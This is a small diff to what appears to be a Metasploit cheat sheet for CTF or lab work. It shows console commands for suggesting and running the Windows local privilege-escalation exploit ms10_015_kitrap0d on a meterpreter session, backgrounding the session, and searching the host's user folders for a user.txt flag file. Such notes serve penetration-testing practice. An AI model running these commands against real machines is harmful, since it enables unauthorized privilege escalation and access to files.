@@ -24,10 +24,17 @@ use post/multi/recon/local_exploit_suggester
 set session 1
 run
 
+Following command can be use to run meterpreter in background:
+background
+
 Run one of the suggested exploit
 use exploit/windows/local/ms10_015_kitrap0d
 set session 1
 run
+
+Following command can be use to search files in meterpreter shell
+
+search -f user.txt "C:\\Users\\"
 
 *****************************************************************************************************************************
 
